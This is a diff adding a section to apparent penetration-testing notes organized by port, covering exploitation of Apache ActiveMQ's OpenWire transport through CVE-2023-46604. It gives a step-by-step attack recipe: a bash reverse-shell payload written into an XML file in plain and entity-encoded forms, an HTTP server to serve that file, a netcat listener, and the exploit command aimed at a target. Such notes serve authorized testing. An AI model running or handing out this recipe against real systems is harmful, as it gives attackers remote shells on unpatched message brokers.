@@ -132,7 +132,48 @@ Advanced Message Queuing Protocol
 # STOMP (61613, 61616)
 Streaming Text Oriented Messaging Protocol
 
-
+# ActiveMQ OpenWire Transport (61616)
+Message Broker (like RabitMQ and Kafka). Written in Java and popular with Java Applications
+## Exploitation
+### CVE-2023-46604-RCE-Reverse-Shell-Apache-MQ
+#### Option 1: Metasploit
+#### Options 2: Github
+1. Clone repository
+2. Alter poc-linux.xml
+```bash
+<list>
+	<value>bash</value>
+	<value>-c</value>
+	<value>bash -i >& /dev/tcp/IP/PORT 0>&1</value>
+</list>
+```
+3. Entity Encode the bash command in poc-linux.xml
+```bash
+<list>
+	<value>bash</value>
+	<value>-c</value>
+	<value>bash -i &#x3E;&#x26; /dev/tcp/IP/PORT 0&#x3E;&#x26;1</value>
+</list>
+```
+```bash
+<list>
+	<value>bash</value>
+	<value>-c</value>
+	<value>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</value>
+</list>
+```
+4. Start Http Server
+```bash
+sudo python3 -m http.server 80
+```
+5. Start Reverse Shell Listener
+```bash
+nc -lvnp 9001
+```
+6. Run Exploit
+```bash
+go run main.go -i TARGET_IP -p PORT=61616 -u http://ATTACKING_IP:80/poc-linux.xml
+```
 # Mystery Port
 ## Connection
 ```bash
